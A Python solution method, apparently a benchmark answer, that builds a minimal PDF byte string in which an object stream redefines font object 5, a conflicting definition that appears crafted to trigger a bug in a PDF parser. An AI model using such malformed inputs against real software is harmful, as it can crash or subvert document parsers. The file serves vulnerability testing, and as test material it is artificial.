class Solution:
    def solve(self, src_path: str) -> bytes:
        pdf = "%PDF-1.4\n\n"
        offsets = {}
        # Object 1: Catalog
        obj1 = "<< /Type /Catalog /Pages 2 0 R >>"
        obj1_str = "1 0 obj\n" + obj1 + "\nendobj\n\n"
        offsets[1] = len(pdf)
        pdf += obj1_str
        # Object 2: Pages
        obj2 = "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj2_str = "2 0 obj\n" + obj2 + "\nendobj\n\n"
        offsets[2] = len(pdf)
        pdf += obj2_str
        # Object 3: Page
        obj3 = "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>"
        obj3_str = "3 0 obj\n" + obj3 + "\nendobj\n\n"
        offsets[3] = len(pdf)
        pdf += obj3_str
        # Object 4: Contents
        contents_stream = "BT /F1 12 Tf 100 700 Td (Hello World) Tj ET"
        length4 = len(contents_stream)
        obj4 = f"<< /Length {length4} >>"
        obj4_str = f"4 0 obj\n{obj4}\nstream\n{contents_stream}\nendstream\nendobj\n\n"
        offsets[4] = len(pdf)
        pdf += obj4_str
        # Object 5: Font (direct)
        obj5 = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        obj5_str = "5 0 obj\n" + obj5 + "\nendobj\n\n"
        offsets[5] = len(pdf)
        pdf += obj5_str
        # Object 6: ObjStm containing another 5
        font2 = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold>>"
        offset_in_stream = 4
        pairs = f"5 {offset_in_stream}\n"
        stream_content = pairs + font2
        first_pos = offset_in_stream
        obj6 = f"<< /Type /ObjStm /N 1 /First {first_pos} >>"
        obj6_str = "6 0 obj\n" + obj6 + "\nstream\n" + stream_content + "\nendstream\nendobj\n\n"
        offsets[6] = len(pdf)
        pdf += obj6_str
        # Xref
        xref_start = len(pdf)
        xref_content = "xref\n0 7\n0000000000 65535 f \n"
        for i in range(1, 7):
            off = f"{offsets[i]:010d}"
            xref_content += f"{off} 00000 n \n"
        pdf += xref_content
        # Trailer
        trailer_content = "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n" + str(xref_start) + "\n%%EOF\n"
        pdf += trailer_content
        return pdf.encode("latin-1")